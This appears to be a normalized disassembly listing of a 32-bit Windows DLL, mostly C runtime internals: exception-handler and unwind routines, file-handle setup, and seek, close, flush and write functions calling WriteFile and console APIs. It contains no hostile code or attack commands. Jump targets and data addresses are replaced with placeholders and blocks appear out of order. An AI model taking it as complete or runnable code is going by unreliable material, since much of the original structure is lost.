mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_10005b30
sub esp 0x14
push ebx
mov ebx [ esp + 0x20 ]
push ebp
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
cmp eax 0xfffffffe
mov [ esp + 0x13 ] 0x0
mov [ esp + 0x18 ] 0x1
lea edi [ ebx + 0x10 ]
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_100026a8
mov eax [ esp + 0x28 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_100026a8
cmp [ ebx + 0xc ] 0xfffffffe
je r-xdata
mov ebp [ ebx + 0xc ]
cmp ebp 0xfffffffe
mov ecx [ esp + 0x30 ]
lea edx [ esp + 0x1c ]
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] ecx
mov [ ebx - 0x4 ] edx
je r-xdata
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
push rw-data
push edi
mov ecx ebx
mov edx 0xfffffffe
call sub_10005e04
jmp r-xdata
lea eax [ ebp + ebp * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
test ecx ecx
lea ebx [ esi + eax * 4 + 0x10 ]
mov eax [ ebx ]
mov [ esp + 0x14 ] eax
je r-xdata
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
cmp eax 0xfffffffe
mov ebp eax
jne r-xdata
mov edx edi
call sub_10005dba
test eax eax
mov [ esp + 0x13 ] 0x1
jl r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_100026a8
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_100026a8
cmp [ esp + 0x13 ] 0x0
je r-xdata
mov [ esp + 0x18 ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ esp + 0x28 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x2c ]
call sub_10005dea
mov eax [ esp + 0x2c ]
cmp [ eax + 0xc ] ebp
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ esp + 0x14 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebp
mov ecx eax
call sub_10005e04
mov eax [ esp + 0x2c ]
push rw-data
call sub_1000bbb2
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_100026a8
mov ecx [ ebx + 0x8 ]
mov edx edi
jmp r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_100026a8
mov edx [ esp + 0x28 ]
push 0x1
push edx
call [ rw-data ]
add esp 0x8
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_1000bd35
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_10005cc8
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_10005d58
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_1000bd35
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_1000bd54
jmp r-xdata
sub_10005d58
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_100026a8
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_10005cc8
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_10005dba
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_10005dea
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push 0x0
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10005e1b
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_1000be55
cmp eax 0xffffffff
pop ecx
jne r-xdata
push edi
push [ esp + 0x14 ]
push 0x0
push [ esp + 0x18 ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_100049cb
mov [ eax ] 0x9
or eax 0xffffffff
pop esi
retn
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
mov eax esi
and esi 0x1f
imul esi esi 0x28
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax edi
push eax
call sub_100049f1
pop ecx
or eax 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
pop edi
pop esi
retn
sub_10005e8d
push 0x10
push r--data
call sub_10005acc
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_100049de
and [ eax ] 0x0
call sub_100049cb
mov [ eax ] 0x9
call sub_100049de
mov [ eax ] edi
call sub_100049cb
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_1000496c
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_10005b11
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
imul esi esi 0x28
mov ecx [ ebx ]
movzx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_1000bec6
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_100049cb
mov [ eax ] 0x9
call sub_100049de
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10005e1b
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10005f5f
mov eax [ ebp - 0x1c ]
sub_10005f69
mov eax [ esp + 0x4 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov eax [ eax + 0x10 ]
pop esi
retn
call sub_100049cb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1000496c
add esp 0x14
or eax 0xffffffff
pop esi
retn
sub_10005f96
push ebx
push esi
mov esi [ esp + 0xc ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
retn
test ax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_10005f69
pop ecx
push eax
call sub_10006cea
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_10005ff8
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_10005f96
test eax eax
pop ecx
je r-xdata
push esi
call sub_1000603a
pop ecx
pop esi
retn
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
pop esi
retn
xor eax eax
pop esi
retn
push esi
call sub_10005f69
push eax
call sub_1000c127
pop ecx
pop ecx
neg eax
sbb eax eax
pop esi
retn
sub_1000603a
push 0x14
push r--data
call sub_10005acc
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_100072ab
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000610b
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_10005b11
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_1000568e
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_100060dc
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_10005ff8
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_10005ff8
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_1000611d
push 0x54
push r--data
call sub_10005acc
xor edi edi
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x64 ]
push eax
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
push 0x28
push 0x20
pop esi
push esi
call sub_100084a8
pop ecx
pop ecx
cmp eax edi
je r-xdata
or eax 0xffffffff
mov [ rw-data ] eax
mov [ rw-data ] esi
lea ecx [ eax + 0x500 ]
jmp r-xdata
cmp eax ecx
jb r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov [ eax + 0x8 ] edi
mov [ eax + 0x24 ] 0x0
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
add eax 0x28
mov ecx [ rw-data ]
add ecx 0x500
cmp [ ebp - 0x32 ] di
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x30 ]
cmp eax edi
je r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x1c ] eax
mov eax 0x800
cmp edi eax
jl r-xdata
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
xor esi esi
inc esi
jmp r-xdata
mov edi eax
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
cmp [ rw-data ] edi
jl r-xdata
mov esi ebx
imul esi esi 0x28
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push 0x28
push 0x20
call sub_100084a8
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
call sub_10005b11
retn
mov [ esi ] edi
and eax 0xff
cmp eax 0x2
jne r-xdata
mov edi [ rw-data ]
lea ecx [ esi * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
lea edx [ eax + 0x500 ]
jmp r-xdata
and [ ebp - 0x20 ] 0x0
test edi edi
jle r-xdata
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
cmp eax edx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_1000ba6d
pop ecx
pop ecx
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
inc [ ebp - 0x20 ]
inc ebx
add [ ebp - 0x1c ] 0x4
cmp [ ebp - 0x20 ] edi
jl r-xdata
cmp ecx 0xfffffffe
je r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
and [ eax + 0x24 ] 0x80
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
add eax 0x28
mov edx [ ecx ]
add edx 0x500
inc esi
inc [ esi + 0x8 ]
jmp r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
test al 0x8
jne r-xdata
mov esi [ ebp - 0x20 ]
mov eax esi
sar eax 0x5
and esi 0x1f
imul esi esi 0x28
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ esi ] eax
mov al [ ebx ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_1000ba6d
pop ecx
pop ecx
test eax eax
je r-xdata
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc [ esi + 0x8 ]
sub_1000635d
push esi
push edi
mov esi rw-data
add esi 0x4
cmp esi rw-data
jl r-xdata
lea eax [ edi + 0x500 ]
jmp r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
pop edi
pop esi
retn
cmp edi eax
jb r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push [ esi ]
call sub_100063a9
and [ esi ] 0x0
pop ecx
mov eax [ esi ]
add edi 0x28
add eax 0x500
lea eax [ edi + 0xc ]
push eax
call [ DeleteCriticalSection@IAT ]
sub_100063a9
push 0xc
push r--data
call sub_10005acc
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_10005b11
retn
cmp [ rw-data ] 0x3
jne r-xdata
push esi
push 0x4
call sub_100072ab
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_10007324
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
call sub_100049cb
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_10004990
mov [ esi ] eax
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100063ff
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
push esi
push eax
call sub_1000734f
pop ecx
pop ecx
push [ ebp + 0x8 ]
jmp r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
sub_10006437
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_1000be55
cmp eax 0xffffffff
pop ecx
je r-xdata
xor edi edi
cmp esi 0x1
mov eax [ rw-data ]
jne r-xdata
xor eax eax
push edi
call sub_100049f1
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x54 ] 0x1
jne r-xdata
pop edi
pop esi
retn
push esi
call sub_1000be55
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x2c ] 0x1
je r-xdata
push 0x2
call sub_1000be55
push 0x1
mov edi eax
call sub_1000be55
cmp eax edi
pop ecx
pop ecx
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_1000bdd4
mov eax esi
and esi 0x1f
imul esi esi 0x28
sar eax 0x5
test edi edi
mov eax [ eax * 4 + rw-data ]
pop ecx
mov [ eax + esi + 0x4 ] 0x0
je r-xdata
sub_100064cb
push 0x10
push r--data
call sub_10005acc
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_100049de
and [ eax ] 0x0
call sub_100049cb
mov [ eax ] 0x9
call sub_100049de
mov [ eax ] edi
call sub_100049cb
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_1000496c
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_10005b11
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
imul esi esi 0x28
mov ecx [ ebx ]
movzx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_1000bec6
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_100049cb
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_10006437
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000658e
mov eax [ ebp - 0x1c ]
sub_10006598
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_100063a9
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_100065c4
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_10005f69
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
test al 0x82
pop ecx
jne r-xdata
test al 0x40
je r-xdata
call sub_100049cb
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_100049cb
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
test ax 0x10c
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
jne r-xdata
test al 0x10
mov [ esi + 0x4 ] ebx
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_10005588
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_10006cea
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
cmp edi ebx
mov [ esi + 0x4 ] ecx
jle r-xdata
push [ ebp + 0xc ]
call sub_1000c3e8
test eax eax
pop ecx
jne r-xdata
call sub_10005588
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_10006cea
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_1000c3a4
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_1000c28b
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
imul eax eax 0x28
mov edx ecx
sar edx 0x5
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_10006724
push ebp
lea ebp [ esp - 0x518 ]
sub esp 0x594
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x514 ] eax
mov eax [ ebp + 0x524 ]
push esi
xor esi esi
cmp [ ebp + 0x528 ] esi
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x60 ] esi
mov [ ebp - 0x68 ] esi
jne r-xdata
cmp eax esi
jne r-xdata
xor eax eax
jmp r-xdata
mov esi [ ebp + 0x520 ]
push ebx
mov ebx esi
and ebx 0x1f
imul ebx ebx 0x28
mov eax esi
sar eax 0x5
push edi
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
add eax ebx
mov cl [ eax + 0x24 ]
add cl cl
sar cl 0x1
cmp cl 0x2
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x55 ] cl
je r-xdata
call sub_100049de
mov [ eax ] esi
call sub_100049cb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1000496c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0x514 ]
xor ecx ebp
pop esi
call sub_100026a8
add ebp 0x518
leave
retn
mov ecx [ ebp + 0x528 ]
not ecx
test cl 0x1
jne r-xdata
cmp cl 0x1
jne r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
call sub_100049de
xor esi esi
mov [ eax ] esi
call sub_100049cb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1000496c
add esp 0x14
jmp r-xdata
push esi
call sub_1000c3e8
test eax eax
pop ecx
je r-xdata
push 0x2
push 0x0
push 0x0
push esi
call sub_1000c208
add esp 0x10
or eax 0xffffffff
jmp r-xdata
mov eax [ edi ]
add eax ebx
test [ eax + 0x4 ] 0x80
je r-xdata
mov eax [ edi ]
test [ ebx + eax + 0x4 ] 0x80
je r-xdata
pop edi
pop ebx
push 0x0
lea ecx [ ebp - 0x6c ]
push ecx
push [ ebp + 0x528 ]
push [ ebp - 0x64 ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x64 ]
xor esi esi
cmp [ ebp - 0x55 ] 0x0
mov [ ebp - 0x54 ] esi
jne r-xdata
call sub_1000452a
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x7c ]
sete cl
push eax
mov eax [ edi ]
push [ ebx + eax ]
mov esi ecx
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x6c ]
and [ ebp - 0x54 ] 0x0
mov [ ebp - 0x60 ] eax
jmp r-xdata
cmp [ ebp - 0x55 ] 0x2
jne r-xdata
cmp [ ebp + 0x528 ] esi
mov [ ebp - 0x50 ] eax
jbe r-xdata
test esi esi
je r-xdata
sub eax [ ebp - 0x68 ]
mov edi [ ebp - 0x70 ]
mov eax [ ebp - 0x60 ]
test eax eax
jne r-xdata
cmp [ ebp + 0x528 ] esi
mov [ ebp - 0x5c ] eax
jbe r-xdata
cmp [ ebp + 0x528 ] esi
mov [ ebp - 0x50 ] eax
jbe r-xdata
mov eax [ edi ]
test [ ebx + eax + 0x4 ] 0x40
je r-xdata
mov ecx [ ebp - 0x50 ]
and [ ebp - 0x5c ] 0x0
sub ecx [ ebp - 0x64 ]
lea eax [ ebp - 0x4c ]
call [ GetConsoleCP@IAT ]
and [ ebp - 0x50 ] 0x0
cmp [ ebp + 0x528 ] 0x0
mov esi [ ebp - 0x64 ]
mov [ ebp - 0x7c ] eax
mov [ ebp - 0x74 ] esi
jbe r-xdata
cmp [ ebp - 0x55 ] 0x0
je r-xdata
push 0x5
pop esi
cmp [ ebp - 0x54 ] esi
jne r-xdata
mov ecx [ ebp - 0x5c ]
and [ ebp - 0x50 ] 0x0
sub ecx [ ebp - 0x64 ]
push 0x2
lea eax [ ebp + 0x3b8 ]
pop esi
mov ecx [ ebp - 0x50 ]
xor esi esi
sub ecx [ ebp - 0x64 ]
lea eax [ ebp - 0x4c ]
call sub_100049cb
mov [ eax ] 0x1c
mov eax [ ebp - 0x64 ]
cmp [ eax ] 0x1a
jne r-xdata
mov esi eax
lea eax [ ebp - 0x4c ]
sub esi eax
push 0x0
lea eax [ ebp - 0x6c ]
push eax
push esi
lea eax [ ebp - 0x4c ]
push eax
mov eax [ edi ]
push [ ebx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov dl [ edx ]
inc ecx
cmp dl 0xa
jne r-xdata
xor esi esi
cmp [ ebp - 0x54 ] esi
je r-xdata
and [ ebp - 0x5c ] 0x0
jmp r-xdata
push [ ebp - 0x54 ]
call sub_100049f1
pop ecx
jmp r-xdata
call sub_100049cb
mov [ eax ] 0x9
jmp r-xdata
xor esi esi
push esi
push esi
push 0x2ab
lea ecx [ ebp + 0x108 ]
push ecx
lea ecx [ ebp + 0x3b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov edi eax
cmp edi esi
je r-xdata
mov edx [ ebp - 0x5c ]
movzx edx [ edx ]
add [ ebp - 0x5c ] esi
add ecx esi
cmp dx 0xa
jne r-xdata
mov esi eax
lea eax [ ebp - 0x4c ]
sub esi eax
push 0x0
lea eax [ ebp - 0x6c ]
push eax
push esi
lea eax [ ebp - 0x4c ]
push eax
mov eax [ edi ]
push [ ebx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x50 ]
add [ ebp - 0x50 ] 0x2
movzx edx [ edx ]
inc ecx
inc ecx
cmp dx 0xa
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x6c ]
add [ ebp - 0x60 ] eax
cmp eax esi
jl r-xdata
mov [ eax ] dl
inc eax
inc [ ebp - 0x5c ]
cmp [ ebp - 0x5c ] 0x400
jb r-xdata
inc [ ebp - 0x68 ]
mov [ eax ] 0xd
inc eax
inc [ ebp - 0x5c ]
mov al [ ebp - 0x55 ]
test al al
jne r-xdata
call sub_100049de
mov [ eax ] esi
push 0x0
lea eax [ ebp - 0x6c ]
push eax
mov eax edi
sub eax esi
push eax
lea eax [ ebp + esi + 0x108 ]
push eax
mov eax [ ebp - 0x70 ]
mov eax [ eax ]
push [ ebx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x50 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x50 ] 0x152
jb r-xdata
mov [ eax ] 0xd
add eax esi
add [ ebp - 0x50 ] esi
mov eax [ ebp - 0x6c ]
add [ ebp - 0x60 ] eax
cmp eax esi
jl r-xdata
mov edi [ ebp - 0x70 ]
mov [ eax ] dx
inc eax
inc eax
inc esi
inc esi
cmp esi 0x3ff
jb r-xdata
add [ ebp - 0x68 ] 0x2
mov [ eax ] 0xd
inc eax
inc eax
inc esi
inc esi
mov eax [ ebp - 0x50 ]
sub eax [ ebp - 0x64 ]
cmp eax [ ebp + 0x528 ]
jb r-xdata
cmp ecx [ ebp + 0x528 ]
jae r-xdata
cmp al 0x1
je r-xdata
mov al [ esi ]
xor ecx ecx
cmp al 0xa
sete cl
movsx eax al
push eax
mov [ ebp - 0x78 ] ecx
call sub_1000a1aa
test eax eax
pop ecx
jne r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x54 ] eax
add esi [ ebp - 0x6c ]
cmp edi esi
jg r-xdata
cmp ecx [ ebp + 0x528 ]
jae r-xdata
mov eax [ ebp - 0x50 ]
sub eax [ ebp - 0x64 ]
cmp eax [ ebp + 0x528 ]
jb r-xdata
cmp ecx [ ebp + 0x528 ]
jae r-xdata
jmp r-xdata
movzx ecx [ esi ]
xor edx edx
cmp cx 0xa
sete dl
inc esi
inc esi
add [ ebp - 0x5c ] 0x2
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x78 ] edx
cmp al 0x2
jne r-xdata
mov eax [ ebp - 0x64 ]
sub eax esi
add eax [ ebp + 0x528 ]
cmp eax 0x1
jbe r-xdata
push 0x1
lea eax [ ebp - 0x54 ]
push esi
push eax
call sub_1000c61b
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x5c ]
sub eax [ ebp - 0x64 ]
cmp eax [ ebp + 0x528 ]
mov [ ebp - 0x60 ] eax
jb r-xdata
jmp r-xdata
jmp r-xdata
push [ ebp - 0x54 ]
call sub_1000c446
cmp ax [ ebp - 0x54 ]
pop ecx
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x2
lea eax [ ebp - 0x54 ]
push esi
push eax
call sub_1000c61b
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
jmp r-xdata
cmp edi esi
jg r-xdata
